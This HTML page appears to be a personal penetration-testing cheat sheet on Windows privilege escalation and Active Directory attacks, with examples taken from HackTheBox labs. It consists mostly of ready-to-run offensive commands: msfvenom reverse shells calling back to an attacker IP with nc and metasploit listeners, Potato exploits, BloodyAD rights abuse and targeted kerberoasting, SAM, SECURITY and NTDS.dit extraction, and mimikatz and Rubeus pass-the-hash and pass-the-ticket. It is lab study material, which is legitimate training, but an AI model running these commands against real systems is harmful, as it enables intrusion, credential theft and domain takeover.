<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/miscStyles.css">
    <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>

    <title>Minimalist Webpage</title>
</head>
<body>
    <script src="/H4ckV4ult/components/navbar.js"></script>
    
    <div id="navbar-container"></div>
    <div class="main-container">
        <div class="sidebar">
            <h3>Quick content</h3>
            <ul id="sidebar-menu"></ul>
        </div>

        <div class="notion-container">
            <div class="notion-header">
                <h1>Windows Privilege Scalation</h1>
            </div>

                <div class="notion-body">
                    <h2 id="Automation">Automation</h2>
                    <ul>
                        <h3> Winpeas.exe </h3>
                        <pre><code class="language-powershell">wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/winPEASx64.exe -outfile wpeas.exe</code></pre>
                    </ul> 
                </div>

                <div class="notion-body">
                    <h2 id="Enumeration">Enumeration</h2>
                    <ul>
                        <pre><code class="language-powershell">systeminfo</code></pre>
                        <pre><code class="language-powershell">wmic qfe</code></pre>
                        <pre><code class="language-powershell">whoami /priv</code></pre>
                        <pre><code class="language-powershell">wohami /groups</code></pre>
                        <pre><code class="language-powershell">net userdns</code></pre>
                        <pre><code class="language-powershell">netstat -ano</code></pre>
                        <pre><code class="language-powershell">route print</code></pre>
                        <pre><code class="language-powershell">sc query windefend</code></pre>
                    </ul>
                    
                    <h2> Valuable files </h2>
                    <ul>
                        <p> Equivalent for .bash_history </p>
                        <pre><code class="language-powershell">C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
                        <p> Check if there are users with autologon</p>
                        <pre><code class="language-powershell">Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object AutoAdminLogon, DefaultUsername, DefaultDomainName, DefaultPassword</code></pre>
                        
                    </ul>    
                </div>
                

                <div class="notion-body">
                    <h2 id="Potatoes">Potatoes</h2>
                    <ul>
                        <p> Watch out for more information <a class="notion-link" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc"> here </a> </p> 
                        <p> Use Sweet Potato to rule them all - Sweet Potato </p>
                        <p> If you do not want to use Sweet Potato:</p>
                        <ul>
                            <li>If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato</li>
                            <li>If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato</li>
                        </ul>
                        <h3> Rogue Potatoes</h3>
                        <h4> Musts </h4>
                        <ul>
                            <li>You need to have a machine under your control where you can perform the redirect and this machine must be accessible on port 135 by the victim</li>
                            <li>Upload both exe files from the PoC</li>
                        </ul>
                        <p> Creation of a shell that will be used later </p>
                        <pre><code class="language-bash">msfvenom -p windows/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f raw -o shell.bat</code></pre>
                        <p> Execute that command in attacker machine to capture connection</p>
                        <pre><code class="language-powershell">socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999</code></pre>
                        <p> Execute that command in victim machine</p>
                        <pre><code class="language-powershell">.\RoguePotato.exe -r VICTIM_IP -e ".\shell.bat" -l 9999</code></pre>
                        <p> Execute that command in attacker machine</p>
                        <pre><code class="language-powershell">nc -lvnp 9999</code></pre>

                        <h3> Juicy Potatoes</h3>
                        <p>Checkout the list of supported SO for the attack<a class="notion-link" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md"> here</a></p>
                        <h4> Musts </h4>
                        <ul>
                            <li><b>SeImpersonatePrivilege</b> must be enabled</li>
                        </ul>
                        <p> Creation of a shell that will be used later </p>
                        <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f exe -o shell.exe</code></pre>
                        <p> Transfer Juicy potatos and shell file previously created and execute. If not CLID is passed the software will take a default one</p>
                        <pre><code class="language-cmd">JuicyPotato.exe -l 1337 -p shell.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</code></pre>
                        <p>Capture the reverse connection with proper tool and interpreter</p>
                        <pre><code class="language-bash">sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.10
set LPORT 9999</code></pre>
                    </ul>
                </div>

                <div class="notion-body">
                    <h2 id="BloodyAD">BloodyAD</h2>
                    <ul>
                        <h3>Adding users to groups</h3>
                        <ul>
                            <p>In case you found that you cant spawn a shell using evilwinrm or psexec you can make use of Bloody AD to perform changes inside the domain. In that case having in mind that we have "GenericAll" permision over a group we can add a user to that group</p>
                            <pre><code class="language-bash">bloodyAD -u 'p.agila@fluffy.htb' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila</code></pre>
                        </ul>
                        <h3>Targeted kerberoasting</h3>
                        <ul>
                            <p>In case you found that you have the right <b>WriteSPN</b> over a user you can perform a targeted kerberoasting attack</p>
                            <p>Here you asign a SPN to the alfred account. This makes the account vulnerable since we can request ticket with impacket tool</p>
                            <pre><code class="language-bash">bloodyAD -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --host 10.10.11.72 set object alfred servicePrincipalName -v 'http/fake.tombwatcher.htb'</code></pre>
                            <p>Then request the ticket with impacket tool, copy the ticket and crack it using hashcat</p>
                            <pre><code class="language-bash">impacket-GetUserSPNs tombwatcher.htb/henry:'H3nry_987TGV!' -dc-ip 10.10.11.72 -request</code></pre>        
                        </ul>  
                        <h3>Dump GSMA password</h3>
                        <ul>
                            <p>In case you found that you have the right <b>readGMSAPassword</b> over a user you can dump the GMSA password using the following script <a class="notion-link" href="https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py"> here </a> </p>
                            <p></p>
                            <pre><code class="language-bash">bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u alfred -p basketball get object ansible_dev$ --attr msDS-ManagedPassword</code></pre>
                            <p>The result of this command outputs the NTLM hash which can be used to authenticate as another user <b>(msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:ecb4146b3f99e6bbf...)</b></p>
                            <p></p>
                        </ul>  

                        <h3>Force Change password</h3>
                        <ul>
                            <p>In case you found that you have the right <b>ForceChangePassword</b> over a user you can change the password of it </p>
                            <p></p>
                            <pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.10.11.72 -d tombwatcher.htb -u "ansible_dev$" -p p@ssword set password SAM "mypassword"</code></pre>
                            <p></p>
                        </ul> 

                        <h3>Change Ownership</h3>
                        <ul>
                            <p>In case you found that you have the right <b>WriteOwner</b> over a user you can change the ownership of that user making it yours</p>
                            <pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb --dc-ip 10.10.11.72 -d tombwatcher.htb -u "SAM" -p mypassword -k set owner john sam</code></pre>
                            <p>Now that the users is ours we can apply <b>FullControl</b> over it. To do so we will use the following script <a class="notion-link" href="https://raw.githubusercontent.com/ShutDownRepo/impacket/dacledit/examples/dacledit.py"> here </a></p>
                            <pre><code class="language-bash">python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'USER_OWNED' -target 'USER_TARGER' 'DOMAIN.LOCAL'/'USER_OWNED':'PASSWORD_OWNED'</code></pre>
                            <p>Then apply a password change with bloodAD and the user is yourse :)</p>
                        </ul>

                    </ul>
                </div>

                <div class="notion-body">
                    <h2 id="Credential hunting">Credential hunting</h2>
                    <ul>    
                        <p>Once we gained access to a computer/domain we can perform credential huntgin by using <b>LaZagne</b></p>
                        <pre><code class="language-powershell">.\LaZagne.exe all</code></pre>
                        <p>Also we can use findstr to discover some filetypes</p>
                        <pre><code class="language-powershell">findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml</code></pre>
                    </ul>
                </div>

                <div class="notion-body">
                    <h2 id="Extracting SAM">Extracting SAM</h2>
                    <ul>
                        <p>In case you found that you have enough privilege to extract config files from Windows like SAM, SYSTEM or SECURITY you could do so by doing...</p>
                        <p>Remember that if your user has admincount = 1 and SeBackupPrivilege enabled (whoami /priv) you could perform the same process</p>
                        <pre><code class="language-powershell">reg  save hklm\sam C:\Users\emily.oscars.CICADA\Documents\sam.hive
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save</code></pre>
                        <p>Then extract the file with download utility (evil-winrm) and use pypkatz/hashcat/secretsdump to view the hashses and perform a pass the hash attack</p>
                        <pre><code class="language-powershell">pypykatz registry --sam sam.hive system.hive</code></pre>
                        <p>Remember that the password hash will have the following form (uid:rid:lmhash:nthash) the important one is the last one nthash. Situate all hashes on a file and attempt to crack them</p>    
                        
                        <h3>Alternative ways to do it</h3>
                        <ul>
                            <p>You can automate this process with netexec</p>
                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></pre>
                            <pre><code class="language-powershell">netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></pre>
                        </ul>    
                    </ul>
                </div>

                <div class="notion-body">
                    <h2 id="Enumerating with cmdkey (Stored credentials)">Enumerating with cmdkey (Stored credentials)</h2>
                    <ul>
                        <p>We can use cmdkey to enumerate the credentials stored in the current user's profile. In case we see another use we could try to login resuing credentials without issuing any cred</p>
                        <p>An example of credentials from another used found</p>
                         <pre><code class="language-powershell">Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles</code></pre>
                        <p>We can reuse the credentials by doing</p>
                        <pre><code class="language-powershell">/savecred /user:SRV01\mcharles cmd </code></pre>
                        <p>Now we can use mimikatz to crack stored passwords from user mcharles</p>
                        <pre><code class="language-powershell">mimikatz # privilege::debug    
mimikatz # sekurlsa::credman  </code></pre>
                        <p><b>It is posible that you requiere to perform a relogin from the victim side</b></p>    
                    </ul>
                </div>

                <div class="notion-body">
                    <h2 id="Exporting NTDS.dit">Exporting NTDS.dit</h2>
                    <ul>
                        <p>Create a volume shadow copy which is basically a windows mecanism to create snapshots of a disk volume while the system is in use</p>
                        <pre><code class="language-powershell">vssadmin CREATE SHADOW /For=C:</code></pre>
                        <p>In order to check where the NTDS.dit file is located we can use re query and look for the parameter <b>DSA Database file</b></p>
                        <pre><code class="language-powershell">reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"</code></pre>
                        
                        <p>Adapt the path... and Then copy the file</p>
                        <pre><code class="language-powershell">cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\</code></pre>
                        <p>Transfer the file and crackit using </p>
                        <pre><code class="language-powershell">secretsdump.py -ntds ntds.dit -system system.save LOCAL</code></pre>
                        <p>Crack the hash by using <b>-m 1000</b> in hashcat (NTLM)</p>
                        <p>Other methods more easier</p>
                        <pre><code class="language-powershell">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</code></pre>
                    
                    </ul>
                </div>

                <div class="notion-body">
                    <h2 id="MS09-012">MS09-012</h2>
                    <ul>
                        <p>RCE in the service spooler which will grant us a privielge scalation method. Checkout github repo<a class="notion-link" href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS09-012/README.md"> here</a></p>
                        <p>Downlad the pr.exe file, transfer it to the victim and execute any command you want</p>
                        <pre><code class="language-cmd">pr.exe "whoami"</code></pre>
                        <p>In case you would like to retrive information about files...ðŸ‘€</p>
                        <pre><code class="language-powershell">pr.exe "more \"C:\\Documents and Settings\\Harry\\Desktop\\user.txt\""</code></pre>    
                    </ul>
                </div>

                <div class="notion-body">
                    <h2 id="Bypassing UAC">Bypassing UAC</h2>
                    <ul>
                        <p>In case you would like to escalate privileges and have access to windows UI you could start msconfig and then spawn a terminal by using the tools. This terminal will be an admin terminal</p>
                    </ul>
                </div>


                <div class="notion-body">
                    <h2 id="Pass the ticket">Pass the ticket</h2>
                    <ul>
                        <p>With the use of mimikatz or rubeus we are able to list all tickets and log in as another users just by using them here i show you how</p>
                        <h3>Mimikatz</h3>
                        <ul>
                           <p>Exporting all tickets</p>
                           <pre><code class="language-powershell">mimikatz# sekurlsa::tickets /export</code></pre>

                           <p>Extracting kerberos keys (aes256_hmac) y (rc4_hmac_nt) </p>
                           <pre><code class="language-powershell">mimikatz# sekurlsa::ekeys</code></pre>

                           <h4>Pass the ticket</h4>
                           <p>Now that we have all the information we need we can use the following command to login as another user</p>
                           <pre><code class="language-powershell">sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</code></pre>
                           
                           <h4>Pass the ticket with powershell</h4>
                           <p>We can use the ticket to perform pass the ticket using powershell. From mimikatz type</p>
                           <pre><code class="language-powershell">kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit</code></pre>
                          <p>Then type</p>  
                           <pre><code class="language-powershell">powershell
Enter-PSSession -ComputerName DC01</code></pre>
                        </ul>

                        <h3>Rubeus</h3>
                        <ul>
                           <p>Exporting all tickets</p>
                           <pre><code class="language-powershell">Rubeus.exe dump /nowrap</code></pre>

                           <p>Pass the ticket</p>
                           <pre><code class="language-powershell">Rubeus.exe ptt /ticket:nameoftheticket.kirbi</code></pre>
                           <p>Another way to do so (aes256_hmac)</p>
                           <pre><code class="language-powershell">Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt</code></pre>

                        </ul>
                    </ul>
                </div>
        </div>
    </div>
</body>

<script>
        
    function generateMenu(){
        const headers = document.querySelectorAll('.notion-container h2');
        const sidebarList = document.querySelector('#sidebar-menu');

        headers.forEach(header => {
            const listItem = document.createElement('li');
            const link = document.createElement('a');
            link.textContent = header.textContent;
            console.log(header.textContent);
            link.setAttribute('href', `#${header.textContent}`);
            listItem.appendChild(link);
            sidebarList.appendChild(listItem);
        });
    }

    // Asegurarse de que ambas funciones se ejecuten despuÃ©s de que todo el contenido estÃ© listo
    window.addEventListener('load', generateMenu);
</script>
</html>
